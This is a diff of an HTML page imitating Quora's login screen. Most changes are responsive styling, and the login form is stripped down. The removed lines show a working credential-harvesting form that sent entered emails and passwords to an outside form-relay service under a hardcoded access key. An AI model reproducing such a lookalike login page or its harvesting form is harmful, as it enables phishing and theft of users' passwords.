@@ -21,7 +21,7 @@
             flex-wrap: wrap;
             background-color: #ffffff;
             max-width: 900px;
-            width: 100%;
+            width: 90%;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             overflow: hidden;
@@ -175,14 +175,46 @@
         }
 
         @media (max-width: 768px) {
+            body {
+                padding: 20px;
+            }
+
             .container {
                 flex-direction: column;
+                width: 100%;
+                max-width: none;
                 border-radius: 0;
+                box-shadow: none;
+            }
+
+            .left-section, .right-section {
+                flex: 1;
+                padding: 15px;
             }
 
             .right-section {
                 border-left: none;
                 border-top: 1px solid #ddd;
+            }
+
+            .left-section h1 {
+                font-size: 1.5rem;
+            }
+
+            .left-section p {
+                font-size: 0.9rem;
+            }
+
+            .right-section h2 {
+                font-size: 1.3rem;
+            }
+
+            .form-group input {
+                font-size: 0.8rem;
+            }
+
+            .login-btn {
+                font-size: 0.9rem;
             }
         }
     </style>
@@ -192,15 +224,10 @@
         <div class="left-section">
             <h1>Quora</h1>
             <p>A place to share knowledge and better understand the world</p>
-           <button>
-    <img 
-        src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" 
-        alt="Google Logo" 
-        style="width: 20px; height: 20px; margin-right: 10px; vertical-align: middle;"
-    >
-    Continue with Google
-</button>
-
+            <button>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google">
+                Continue with Google
+            </button>
             <button>
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook">
                 Continue with Facebook
@@ -209,17 +236,14 @@
         </div>
         <div class="right-section">
             <h2>Login</h2>
-           <form action="https://api.web3forms.com/submit" method="POST">
-                <input type="hidden" name="access_key" value="00ed92cb-5032-4578-b9be-306700b2271e">
-                <inp ut type="hidden" name="subject" value="New Submission from Jayjay">
-                <input type="hidden" name="from_name" value="Your Website Name">
+            <form>
                 <div class="form-group">
                     <label for="email">Email</label>
-                    <input type="email" id="email" placeholder="Your email" name="email">
+                    <input type="email" id="email" placeholder="Your email">
                 </div>
                 <div class="form-group">
                     <label for="password">Password</label>
-                    <input type="password" id="password" placeholder="Your password" name="pass">
+                    <input type="password" id="password" placeholder="Your password">
                 </div>
                 <a href="#" class="forgot-password">Forgot password?</a>
                 <button type="submit" class="login-btn">Login</button>
